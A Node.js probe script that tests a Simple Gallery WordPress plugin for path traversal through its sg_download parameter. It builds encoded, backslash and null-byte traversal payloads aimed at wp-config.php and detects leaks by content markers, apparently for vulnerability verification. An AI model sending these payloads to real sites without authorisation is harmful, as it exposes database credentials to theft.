// probe.mjs - exploit-verification probe for Simple Gallery sg_download path traversal.
// Usage: node probe.mjs <base-url>
// Exit 0 = VULNERABLE (some traversal variant returned a known server-side file)
// Exit 1 = NOT VULNERABLE (no variant returned file content; control request behaves)
// Exit 2 = probe error (bad argument, target unreachable, or control inconclusive)
// Read-only: sends GET requests only, to the single origin given. Changes no state.

const EXIT_VULNERABLE = 0;
const EXIT_NOT_VULNERABLE = 1;
const EXIT_ERROR = 2;

function fail(msg, code) {
	console.error(`[probe] ${msg}`);
	process.exit(code);
}

const arg = process.argv[2];
if (process.argv.length !== 3 || !arg) {
	fail('usage: node probe.mjs <base-url>', EXIT_ERROR);
}

let base;
try {
	base = new URL(arg);
} catch {
	fail(`invalid base URL: ${arg}`, EXIT_ERROR);
}
if (base.protocol !== 'http:' && base.protocol !== 'https:') {
	fail('base URL must be http(s)', EXIT_ERROR);
}
// Only ever talk to this origin.
const ORIGIN = base.origin;
const ENDPOINT = `${ORIGIN}/`;

// Gallery files live in <wp-root>/wp-content/uploads/simple-gallery/, so reaching the WP root
// (where wp-blog-header.php and wp-config.php live) needs exactly 3 "up" steps. Going higher than
// that falls off the filesystem root and misses, so depth is swept over a small range.
const TRAVERSE_DEPTHS = [2, 3, 4];

// Marker strings are content INSIDE the target files, not the path, so filename keyword
// filters do not change detection.
const BLOG_HEADER_MARKER = 'Loads the WordPress environment';
const CONFIG_MARKER = 'DB_NAME';

function buildVariants() {
	const out = [];
	for (const d of TRAVERSE_DEPTHS) {
		const dots = '../'.repeat(d);
		const enc = '..%2f'.repeat(d);
		const bsl = '..\\'.repeat(d);
		const encBsl = '..%5c'.repeat(d);
		const dd = '....//'.repeat(d);
		out.push([`plain dot-dot x${d}`, `${dots}wp-blog-header.php`, BLOG_HEADER_MARKER]);
		out.push([`url-encoded slash x${d}`, `${enc}wp-blog-header.php`, BLOG_HEADER_MARKER]);
		out.push([`backslash x${d}`, `${bsl}wp-blog-header.php`, BLOG_HEADER_MARKER]);
		out.push([`url-encoded backslash x${d}`, `${encBsl}wp-blog-header.php`, BLOG_HEADER_MARKER]);
		out.push([`doubled-dot bypass x${d}`, `${dd}wp-blog-header.php`, BLOG_HEADER_MARKER]);
		out.push([`null byte suffix x${d}`, `${dots}wp-blog-header.php%00cake1.svg`, BLOG_HEADER_MARKER]);
		out.push([`wp-config plain x${d}`, `${dots}wp-config.php`, CONFIG_MARKER]);
		out.push([`wp-config url-encoded x${d}`, `${enc}wp-config.php`, CONFIG_MARKER]);
	}
	return out;
}

async function get(payload) {
	const url = `${ENDPOINT}?sg_download=${payload}`;
	const res = await fetch(url, {
		method: 'GET',
		redirect: 'manual',
		signal: AbortSignal.timeout(10000),
	});
	const body = await res.text();
	return { status: res.status, body };
}

async function main() {
	// Control: a nonexistent file must NOT produce content. If it does, marker checks
	// can't be trusted, so exit as an error instead of guessing.
	let control;
	try {
		control = await get('nonexistent-probe-control-zz9.svg');
	} catch (err) {
		fail(`target unreachable at ${ORIGIN}: ${err.message}`, EXIT_ERROR);
	}
	if (control.status === 200 && control.body.length > 0) {
		fail('control request returned content for a nonexistent file; cannot judge', EXIT_ERROR);
	}

	for (const [label, payload, marker] of buildVariants()) {
		let r;
		try {
			r = await get(payload);
		} catch (err) {
			console.log(`[probe] ${label}: request error (${err.message})`);
			continue;
		}
		const hit = r.status === 200 && r.body.includes(marker);
		console.log(`[probe] ${label}: status=${r.status} bytes=${r.body.length} ${hit ? 'LEAK' : 'no'}`);
		if (hit) {
			console.log(`[probe] VULNERABLE: ${ORIGIN} exposed a server file via "${label}"`);
			process.exit(EXIT_VULNERABLE);
		}
	}

	console.log('[probe] NOT VULNERABLE: no traversal variant returned server file content');
	process.exit(EXIT_NOT_VULNERABLE);
}

main().catch((err) => fail(`unexpected error: ${err && err.stack ? err.stack : err}`, EXIT_ERROR));
